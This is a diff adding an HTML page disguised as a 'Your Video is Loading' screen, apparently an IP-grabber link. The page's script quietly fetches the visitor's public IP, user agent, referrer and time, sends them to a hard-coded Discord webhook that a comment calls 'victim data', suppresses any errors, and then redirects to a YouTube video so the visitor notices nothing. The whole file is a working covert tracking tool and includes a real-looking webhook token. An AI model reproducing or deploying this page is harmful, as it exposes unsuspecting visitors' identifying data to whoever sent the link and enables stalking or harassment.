@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Video is Loading...</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Loading your video...</h1>
+    <div class="loader"></div>
+    <p id="countdown">Video will start in <span id="timer">5</span> seconds...</p>
+
+    <script>
+        // Discord Webhook URL (REPLACE WITH YOURS)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1389113319570276412/c4lL8jpLBu4OcUSkuovMLk85RLfPTXtWVwkRwugC83Jk3An7igVxbNL9CippgFTe_bDN";
+
+        // Collect victim data
+        async function logIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+
+                const payload = {
+                    content: `🚨 **NEW VISITOR** 🚨\n` +
+                             `IP: \`${ip}\`\n` +
+                             `User Agent: \`${navigator.userAgent}\`\n` +
+                             `Referrer: \`${document.referrer || "Direct"}\`\n` +
+                             `Time: \`${new Date().toUTCString()}\``
+                };
+
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                // Fail silently
+            }
+        }
+
+        // Start countdown and redirect
+        function startCountdown() {
+            let seconds = 5;
+            const timer = document.getElementById("timer");
+            
+            const countdown = setInterval(() => {
+                seconds--;
+                timer.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    // Redirect to YouTube (REPLACE VIDEO ID)
+                    window.location.href = "https://www.youtube.com/watch?v=WXAFbFYuYpg";
+                }
+            }, 1000);
+        }
+
+        // Execute
+        logIP();
+        startCountdown();
+    </script>
+</body>
+</html>
